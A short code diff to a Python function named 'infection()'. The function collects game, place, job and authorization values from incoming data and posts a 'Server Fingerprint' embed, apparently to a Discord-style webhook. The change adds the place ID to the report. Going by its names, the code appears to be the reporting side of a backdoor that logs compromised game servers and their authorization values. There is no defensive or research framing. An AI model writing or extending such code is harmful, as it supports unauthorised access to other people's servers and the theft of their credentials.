@@ -136,12 +136,12 @@ def infection():
 
     # important stuff
     gameid = data.get("game-id", "?") ##
-    placeid = data.get("place-id", "?")
     authorization = data.get("authorization", "?") #
 
     # server fingerprint
     jobid = data.get("job-id", "?") #
     playercount = data.get("player-count", "?") ##
+    placeid = str(data.get("place-id", "?"))
 
     # game fingerprint
     gamedata = getGameInfo(universeId=gameid)
@@ -188,7 +188,7 @@ def infection():
                         },
                         {
                             "name": "> Server Fingerprint",
-                            "value": f"> `jobId:` {jobid}\n> `totalPlayers:` {playercount}"
+                            "value": f"> `jobId:` {jobid}\n> `totalPlayers:` {playercount}\n> `placeId:` {placeid}"
                         }
                     ],
                     "footer": {
